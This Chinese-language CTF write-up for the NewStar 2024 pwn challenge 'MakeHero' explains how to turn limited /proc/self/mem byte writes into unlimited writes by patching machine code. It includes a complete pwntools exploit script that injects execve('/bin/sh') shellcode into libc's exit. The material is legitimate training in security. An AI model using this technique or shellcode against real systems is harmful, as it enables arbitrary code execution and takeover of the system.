# MakeHero

> 分类：Pwn

## 题目描述
程序通过 `open("/proc/self/mem")` 实现任意地址单字节改写（无视各地址段读写权限）。读入两个数字，`%lx` 是地址，`%hhx` 是要改的字节。程序对 `v6` 的取值做了限制：第一次能改 ELF 段，第二次能改 libc 段，只有两次机会。

```c
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  ...
  v5 = 2;
  ...
  while ( 1 )
  {
    if ( !v5-- )
    {
      ...
      exit(0);
    }
    ...
    if ( (unsigned int)__isoc99_scanf("%lx %hhx", &v6, &v4) != 2 )
    { ... }
    if ( v5 == 1 )
    {
      if ( v6 < qword_4060 || v6 >= qword_4068 )
        goto LABEL_7;
LABEL_11:
      sub_1369(v6, v4);
    }
    else
    {
      if ( v6 >= qword_4050 && v6 < qword_4058 )
        goto LABEL_11;
LABEL_7:
      puts(aOhNo);
    }
  }
}
```

`sub_1369` 通过 lseek + write 对 `/proc/self/mem` 任意写。`qword_4060`/`qword_4068` 是 ELF 的地址范围，`qword_4050`/`qword_4058` 是 libc 的地址范围。

## 考察知识点
- `/proc/self/mem` 任意地址写
- 修改机器码改变程序控制流（`v5--` -> `v5++`）
- 写入 shellcode GetShell
- gdb 动调确定地址分布

## 解法
仅有的两次机会不足以拿 flag，需要靠这两次机会换取「无限次」任意写。通过修改跳转条件，把 `v5--` 改为 `v5++`（`8D 50 FF` -> `8D 50 01`），即可一直任意写。之后将 exit 处代码改为 shellcode 来 GetShell。

```python
#!/usr/bin/env python3
from pwn import *

context(log_level='debug', arch='amd64', os='linux')
context.terminal = ["tmux", "splitw", "-h"]
uu64 = lambda x: u64(x.ljust(8, b'\x00'))
s = lambda x: p.send(x)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
sla = lambda x, y: p.sendlineafter(x, y)
r = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)

p = process('./MakeHero')
libc = ELF("./libc.so.6")

def u8_ex(data) -> int:
    assert isinstance(data, (str, bytes)), "wrong data type!"
    length = len(data)
    assert length <= 1, "len(data) > 1!"
    if isinstance(data, str):
        data = data.encode('latin-1')
    data = data.ljust(1, b"\x00")
    return unpack(data, 8)

def write_mem(addr, byte):
    if isinstance(byte, bytes):
        sla(b'\x89\xef\xbc\x81', hex(addr) + ' ' + hex(u8_ex(byte)))
    elif isinstance(byte, int):
        sla(b'\x89\xef\xbc\x81', hex(addr) + ' ' + hex(byte))

def write_code(addr, code):
    for i in range(len(code)):
        write_mem(addr + i, code[i])

ru(b'** ')
code_base = int(p.recvuntil(b' -', drop=True), 16)

ru(b'## ')
libc_base = int(p.recvuntil(b' -', drop=True), 16)

sl(b'inkey')

write_mem(code_base + 0x1877, 0x1)
write_mem(libc_base + libc.sym.exit + 4, b'\x90')
write_mem(code_base + 0x1877, 0x1)
write_code(libc_base + libc.sym.exit + 5, b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05")
sl(b'bye')

p.interactive()
```

## 参考答案
（未给出）

## 来源
- 作者：NewStar CTF 2024 官方 WriteUp | https://newstar.wiki/wp/2024/week4/pwn/makehero.html
